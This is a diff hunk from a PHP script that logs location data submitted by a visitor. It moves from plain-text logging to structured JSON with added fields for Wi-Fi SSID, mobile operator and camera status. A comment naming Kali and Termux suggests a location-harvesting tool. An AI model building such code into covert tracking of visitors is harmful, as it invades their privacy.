@@ -30,14 +30,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $_SESSION['lat'] = $lat;
             $_SESSION['lon'] = $lon;
             session_regenerate_id(true);
-            // Log the submission (works on Linux, Kali, Termux)
-            $logDir = __DIR__ . '/logs';
-            if (!is_dir($logDir)) {
-                mkdir($logDir, 0755, true);
-            }
-            $logFile = $logDir . '/location.log';
-            $logEntry = date('c') . " - lat={$lat}, lon={$lon}\n";
-            file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
+            // Log the submission with structured JSON
+            require_once __DIR__ . '/utils.php';
+            $logEntry = [
+                'lat' => $lat,
+                'lon' => $lon,
+                'city' => null,
+                'country' => null,
+                'address' => null,
+                'postal_code' => null,
+                'wifi_ssid' => null,
+                'mobile_operator' => null,
+                'camera_status' => null,
+            ];
+            logData('location', $logEntry);
             // Redirect (Post/Redirect/Get) to avoid duplicate submissions
             header('Location: ' . $_SERVER['PHP_SELF']);
             exit();
